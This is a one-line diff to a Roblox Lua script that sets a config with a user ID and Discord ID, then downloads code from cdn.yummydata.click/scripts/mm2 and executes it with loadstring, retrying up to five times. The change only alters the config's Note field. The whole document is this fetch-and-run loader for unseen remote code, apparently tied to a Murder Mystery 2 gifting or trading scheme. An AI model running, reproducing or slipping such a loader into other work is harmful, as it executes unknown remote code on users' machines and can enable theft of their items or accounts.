@@ -1,1 +1,1 @@
-_G.Config={UserID="a7916749-0080-4d07-b4aa-3c4cb61484a1",discord_id="935143471243726858",Note"Gift"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/mm2"))()end)if s then break end wait(5)end
+_G.Config={UserID="a7916749-0080-4d07-b4aa-3c4cb61484a1",discord_id="935143471243726858",Note="PcGift"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/mm2"))()end)if s then break end wait(5)end
